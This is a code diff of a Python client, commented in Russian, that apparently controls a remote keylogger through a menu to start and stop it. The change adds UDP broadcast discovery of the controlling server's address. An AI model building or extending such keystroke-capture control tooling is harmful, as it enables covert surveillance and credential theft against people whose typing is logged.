@@ -49,9 +49,9 @@ def send_command(s, command, file_path=None):
         print(f"An error occurred: {e}")
 
 # Основное меню клиента
-def client_menu():
+def client_menu(server_ip):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect(('localhost', 8080))  # Замените на IP-адрес вашего сервера
+        s.connect((server_ip, 8080))  # Замените на IP-адрес вашего сервера
         while True:
             print("\n1. Start keylogger")
             print("2. Stop keylogger")
@@ -89,5 +89,29 @@ def client_menu():
                 print("Invalid choice. Please try again.")
 
 # Запуск меню клиента
+def discover_server():
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client_socket:
+        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        client_socket.sendto("DISCOVER_SERVER".encode('utf-8'), ('<broadcast>', 8081))
+
+        # Ожидание ответа от сервера
+        try:
+            client_socket.settimeout(5)
+            data, addr = client_socket.recvfrom(1024)
+            print(f"Server IP discovered: {data.decode('utf-8')}")
+            return data.decode('utf-8').split(':')[1]
+        except socket.timeout:
+            print("No server response received.")
+            return None
+
+
+def start_client():
+    server_ip = discover_server()
+    if server_ip:
+        client_menu(server_ip)
+    else:
+        print("Failed to discover server. Exiting...")
+
+
 if __name__ == "__main__":
-    client_menu()
+    start_client()
